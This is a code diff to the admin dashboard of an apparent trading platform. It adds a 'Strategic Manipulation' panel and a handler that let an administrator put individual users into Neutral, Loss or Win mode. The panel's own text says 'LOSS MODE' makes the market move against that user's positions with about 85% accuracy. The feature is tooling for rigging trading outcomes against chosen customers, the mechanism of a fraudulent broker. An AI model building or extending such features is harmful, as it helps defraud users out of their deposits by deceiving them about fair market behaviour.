@@ -674,6 +674,31 @@ export default function AdminDashboard() {
     }
   };
 
+  const handleUpdateUserManipulation = async (uid: string, mode: 'neutral' | 'loss' | 'win') => {
+    try {
+      const idToken = await auth.currentUser?.getIdToken();
+      const res = await fetch('/api/admin/users/manipulation', {
+        method: 'POST',
+        headers: { 
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${idToken}`
+        },
+        body: JSON.stringify({ uid, mode })
+      });
+      const data = await res.json();
+      if (data.success) {
+        toast.success(`User manipulation set to: ${mode.toUpperCase()}`);
+        setSelectedUserDetail((prev: any) => ({ ...prev, manipulationMode: mode }));
+        setUsers(users.map(u => u.uid === uid || u.id === uid ? { ...u, manipulation_mode: mode } : u));
+        await logAdminAction('User Manipulation Update', `Updated manipulation mode for ${uid} to ${mode}`);
+      } else {
+        toast.error(data.error || 'Failed to update manipulation mode');
+      }
+    } catch (err: any) {
+      toast.error(err.message || 'Failed to update manipulation mode');
+    }
+  };
+
   const handleUpdateUserField = async (userId: string, field: string, value: any, label: string) => {
     if (!isAdminPerm) return;
     try {
@@ -4109,6 +4134,41 @@ export default function AdminDashboard() {
                                     </div>
 
                                     <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
+                                        <div className="bg-[#050507] p-8 rounded-[40px] border border-white/5 space-y-6">
+                                            <div className="flex items-center gap-4">
+                                                <div className="w-12 h-12 rounded-2xl bg-orange-500/10 flex items-center justify-center text-orange-500 border border-orange-500/10">
+                                                    <Target size={20} />
+                                                </div>
+                                                <h4 className="text-[11px] font-black uppercase tracking-[0.2em] text-gray-500">Strategic Manipulation</h4>
+                                            </div>
+                                            <div className="space-y-4">
+                                                <p className="text-[10px] text-gray-500 leading-relaxed font-medium">
+                                                    Configure market movement behavior specifically for this user. "LOSS MODE" ensures market moves against user positions with ~85% accuracy.
+                                                </p>
+                                                <div className="grid grid-cols-3 gap-2">
+                                                    {[
+                                                        { id: 'neutral', label: 'Neutral', color: 'gray' },
+                                                        { id: 'loss', label: 'Loss Mode', color: 'red' },
+                                                        { id: 'win', label: 'Win Mode', color: 'green' }
+                                                    ].map((mode) => (
+                                                        <button
+                                                            key={`manip-mode-${mode.id}`}
+                                                            onClick={() => handleUpdateUserManipulation(selectedUserDetail.id, mode.id as any)}
+                                                            className={`py-3 rounded-xl text-[9px] font-black uppercase tracking-widest transition-all border ${
+                                                                (selectedUserDetail.manipulationMode || selectedUserDetail.manipulation_mode || 'neutral') === mode.id
+                                                                    ? mode.id === 'loss' ? 'bg-red-500 text-white border-red-500 shadow-lg shadow-red-500/20' : 
+                                                                      mode.id === 'win' ? 'bg-green-500 text-black border-green-500 shadow-lg shadow-green-500/20' : 
+                                                                      'bg-white text-black border-white'
+                                                                    : 'bg-white/5 text-gray-500 border-white/5 hover:bg-white/10'
+                                                            }`}
+                                                        >
+                                                            {mode.label}
+                                                        </button>
+                                                    ))}
+                                                </div>
+                                            </div>
+                                        </div>
+
                                         <div className="bg-[#050507] p-8 rounded-[40px] border border-white/5 space-y-6">
                                             <div className="flex items-center gap-4">
                                                 <div className="w-12 h-12 rounded-2xl bg-purple-500/10 flex items-center justify-center text-purple-500 border border-purple-500/10">
